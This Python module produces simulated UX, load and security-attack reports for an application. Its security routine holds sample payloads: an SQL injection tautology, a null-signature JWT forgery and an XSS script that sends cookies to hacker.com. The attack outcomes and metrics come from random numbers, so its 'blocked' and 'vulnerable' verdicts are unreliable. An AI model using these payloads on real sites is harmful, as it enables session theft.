import uuid
import random
import json
from typing import Dict, Any, List
from sqlmodel import Session
from backend.app.models.schemas import Application, Simulation, Gene

class SimulationEngine:
    @staticmethod
    def run_ux_journey_simulation(app_name: str, genes: List[Gene]) -> Dict[str, Any]:
        """Simulates 1000 user journeys and returns UX analytics and drop-offs."""
        logs = []
        latency_base = 50
        frustration = 1.2
        bugs = 0
        
        # Look for genes that might cause high latency or frustration
        has_auth = any("auth" in g.name.lower() for g in genes)
        has_pay = any("payment" in g.name.lower() for g in genes)
        
        steps = ["Landing Page Load", "Main Workspace Focus", "Trigger Navigation Route"]
        if has_auth:
            steps.extend(["JWT Token Request", "Profile Load"])
        if has_pay:
            steps.extend(["Stripe Invoice Setup", "Checkout Charge Trigger"])
            
        total_sessions = 1000
        completed_sessions = 1000
        
        for idx, step in enumerate(steps):
            # Calculate drop-off probabilities
            drop_rate = random.uniform(0.01, 0.05) if idx < 3 else random.uniform(0.04, 0.12)
            dropped = int(completed_sessions * drop_rate)
            completed_sessions -= dropped
            
            step_latency = random.randint(15, 60)
            if "Stripe" in step:
                step_latency += random.randint(100, 300)
            if "JWT" in step:
                step_latency += random.randint(40, 90)
                
            latency_base += step_latency
            
            # Predict bugs
            if random.random() < 0.05:
                bugs += random.randint(1, 2)
                frustration += 1.5
                
            logs.append({
                "step": step,
                "active_users": completed_sessions,
                "dropped_users": dropped,
                "latency_ms": step_latency,
                "status": "Success" if random.random() > 0.02 else "Warning: Slow Query"
            })
            
        drop_off_pct = round(((total_sessions - completed_sessions) / total_sessions) * 100, 2)
        
        return {
            "name": f"1000 User Journeys - {app_name}",
            "type": "Journey",
            "failure_rate": drop_off_pct,
            "predicted_bugs": bugs,
            "frustration_index": min(round(frustration, 1), 10.0),
            "latency_ms": latency_base,
            "logs": logs
        }

    @staticmethod
    def run_scale_event_simulation(app_name: str, framework: str) -> Dict[str, Any]:
        """Simulates 1000 concurrent request load spikes and queue delays."""
        logs = []
        concurrency = [10, 100, 500, 1000]
        peak_latency = 0
        failure_count = 0
        
        # FastAPI scales better than Django/Express usually
        scale_coef = 1.0
        if "fastapi" in framework.lower():
            scale_coef = 0.6
        elif "django" in framework.lower():
            scale_coef = 1.4
            
        for c in concurrency:
            load_factor = (c / 1000.0)
            cpu_load = min(round(10 + (load_factor * 80 * scale_coef), 1), 100.0)
            mem_mb = int(120 + (load_factor * 600))
            
            latency = int((40 + (load_factor * 250 * scale_coef)) + random.randint(-10, 20))
            peak_latency = max(peak_latency, latency)
            
            errs = 0
            if c > 500:
                err_prob = 0.01 * scale_coef
                errs = int(c * err_prob)
                failure_count += errs
                
            logs.append({
                "concurrency": c,
                "cpu_load_pct": cpu_load,
                "memory_usage_mb": mem_mb,
                "latency_ms": latency,
                "errors": errs,
                "status": "Healthy" if cpu_load < 80 else "Resource Constrained"
            })
            
        failure_rate = round((failure_count / sum(concurrency)) * 100, 2)
        
        return {
            "name": f"1000 Concurrency Spike - {app_name}",
            "type": "Scale",
            "failure_rate": failure_rate,
            "predicted_bugs": int(failure_count / 10) + 1 if failure_count > 0 else 0,
            "frustration_index": round(1.0 + (peak_latency / 150.0), 1),
            "latency_ms": peak_latency,
            "logs": logs
        }

    @staticmethod
    def run_security_attack_simulation(app_name: str, genes: List[Gene]) -> Dict[str, Any]:
        """Simulates 1000 attack exploits (SQL Injection, XSS, JWT forging)."""
        logs = []
        exploits_prevented = 0
        exploits_succeeded = 0
        
        # Check if auth/security genes are missing
        has_auth = any("auth" in g.name.lower() or "security" in g.name.lower() for g in genes)
        
        attacks = [
            {"type": "SQL Injection", "payload": "SELECT * FROM users WHERE id = '1' OR '1'='1'"},
            {"type": "JWT Forgery", "payload": "Header: HS256, payload: admin=true, signature: null"},
            {"type": "Cross-Site Scripting (XSS)", "payload": "<script>fetch('http://hacker.com/steal?c=' + document.cookie)</script>"},
            {"type": "Secrets Scan", "payload": "Scan for exposed AWS keys or DB password configs"}
        ]
        
        for atk in attacks:
            success = False
            # Check security resilience
            if atk["type"] == "SQL Injection":
                success = random.random() < 0.05 # low chance due to standard query sanitizers
            elif atk["type"] == "JWT Forgery":
                success = not has_auth or (random.random() < 0.08)
            elif atk["type"] == "Cross-Site Scripting (XSS)":
                success = random.random() < 0.15 # Higher risk in client-side HTML renders
            elif atk["type"] == "Secrets Scan":
                success = random.random() < 0.02
                
            if success:
                exploits_succeeded += 250 # Represents successful penetrations
                logs.append({
                    "attack_vector": atk["type"],
                    "payload_signature": atk["payload"][:40] + "...",
                    "status": "Vulnerable: Exploit Completed",
                    "severity": "CRITICAL"
                })
            else:
                exploits_prevented += 250
                logs.append({
                    "attack_vector": atk["type"],
                    "payload_signature": atk["payload"][:40] + "...",
                    "status": "Blocked: Shield Active",
                    "severity": "Low"
                })
                
        vuln_rate = round((exploits_succeeded / 1000) * 100, 2)
        
        return {
            "name": f"1000 Attacks Sandbox - {app_name}",
            "type": "Attack",
            "failure_rate": vuln_rate,
            "predicted_bugs": int(exploits_succeeded / 100),
            "frustration_index": 9.5 if exploits_succeeded > 0 else 1.0,
            "latency_ms": 12, # security gateway overhead
            "logs": logs
        }

    @classmethod
    def execute_full_simulation(cls, app_id: str, session: Session) -> List[Simulation]:
        """Runs all three simulations and commits logs to database."""
        app = session.query(Application).filter(Application.id == app_id).first()
        if not app:
            raise ValueError("Application not found")
            
        genes = session.query(Gene).filter(Gene.application_id == app_id).all()
        
        sims = []
        
        # 1. UX Journey
        ux_data = cls.run_ux_journey_simulation(app.name, genes)
        ux_sim = Simulation(
            id=str(uuid.uuid4()),
            application_id=app_id,
            name=ux_data["name"],
            simulation_type=ux_data["type"],
            failure_rate=ux_data["failure_rate"],
            predicted_bugs=ux_data["predicted_bugs"],
            frustration_index=ux_data["frustration_index"],
            latency_ms=ux_data["latency_ms"]
        )
        ux_sim.logs = ux_data["logs"]
        sims.append(ux_sim)
        session.add(ux_sim)
        
        # 2. Scale Concurrency
        scale_data = cls.run_scale_event_simulation(app.name, app.framework)
        scale_sim = Simulation(
            id=str(uuid.uuid4()),
            application_id=app_id,
            name=scale_data["name"],
            simulation_type=scale_data["type"],
            failure_rate=scale_data["failure_rate"],
            predicted_bugs=scale_data["predicted_bugs"],
            frustration_index=scale_data["frustration_index"],
            latency_ms=scale_data["latency_ms"]
        )
        scale_sim.logs = scale_data["logs"]
        sims.append(scale_sim)
        session.add(scale_sim)
        
        # 3. Security Attack
        sec_data = cls.run_security_attack_simulation(app.name, genes)
        sec_sim = Simulation(
            id=str(uuid.uuid4()),
            application_id=app_id,
            name=sec_data["name"],
            simulation_type=sec_data["type"],
            failure_rate=sec_data["failure_rate"],
            predicted_bugs=sec_data["predicted_bugs"],
            frustration_index=sec_data["frustration_index"],
            latency_ms=sec_data["latency_ms"]
        )
        sec_sim.logs = sec_data["logs"]
        sims.append(sec_sim)
        session.add(sec_sim)
        
        session.commit()
        return sims
